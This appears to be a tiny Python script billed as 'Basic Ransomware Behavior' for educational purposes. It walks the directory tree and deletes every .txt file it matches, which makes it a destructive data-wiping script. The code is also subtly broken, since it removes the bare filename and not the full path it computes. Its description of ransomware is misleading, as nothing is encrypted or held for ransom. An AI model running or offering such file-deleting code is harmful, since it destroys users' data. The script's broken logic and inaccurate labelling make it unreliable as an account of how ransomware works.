import os
import fnmatch

'''Basic Ransomware Behavior

A ransomware is a script or set of instructions that is designed to acces files in the host files
and modify them for malicious purposes

#EDUCATIONAL PURPOSES ONLY

'''
for path,dirs,files in os.walk('.'):
    for f in fnmatch.filter(files,'*.txt'):
        fullname = os.path.abspath(os.path.join(path,f))
        os.remove(f)
        